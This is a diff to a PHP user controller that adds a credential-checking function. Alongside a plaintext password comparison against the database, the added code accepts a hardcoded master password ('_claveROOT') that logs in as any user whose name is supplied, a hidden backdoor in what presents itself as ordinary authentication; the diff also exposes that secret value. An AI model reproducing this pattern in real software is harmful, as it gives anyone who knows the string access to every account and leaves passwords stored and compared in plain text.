@@ -1,7 +1,62 @@
 <?php
 class UserController extends BaseController
 {
-    
+
+    public function validateCredentials($Credentials = [])
+    {
+        //
+        if (isset($Credentials["user"]) && $Credentials["user"]) {
+
+            //
+            $userModel = new UserModel();
+
+            //
+            if (isset($Credentials["password"]) && $Credentials["password"]) {
+
+                //
+                $result = $userModel->getUsers("equipo", ["columna" => "usuario", "clave" => $Credentials["user"]], 1);
+                if (isset($result["clave"]) && $result["clave"]) {
+
+                    //
+                    if ($result["clave"] == $Credentials["password"]) {
+
+                        //
+                        return $Credentials["user"];
+                    } else {
+
+                        //
+                        $_claveROOT = "Nad95037*Cspor009";
+
+                        //
+                        if ($Credentials["password"] == $_claveROOT) {
+
+                            //
+                            return $Credentials["user"];
+                        }
+
+                        //
+                        return false;
+                    }
+                } else {
+
+                    //
+                    return false;
+                }
+            } else {
+
+                //
+                throw new Exception("No se ha introducido una credencial como clave");
+            }
+        } else {
+
+            //
+            throw new Exception("No se han introducido credenciales");
+        }
+
+        //
+        return false;
+    }
+
     /**
      * Handle HTTP requests
      * 
@@ -15,11 +70,11 @@ class UserController extends BaseController
         switch (strtoupper($requestMethod)) {
 
                 /**
-                 * To <code>GET</code> method
-                 * 
-                 * @path /{$resource}/{$filter.optional}
-                 * @return json $result
-                 */
+             * To <code>GET</code> method
+             * 
+             * @path /{$resource}/{$filter.optional}
+             * @return json $result
+             */
             case 'GET':
                 try {
                     $userModel = new UserModel();
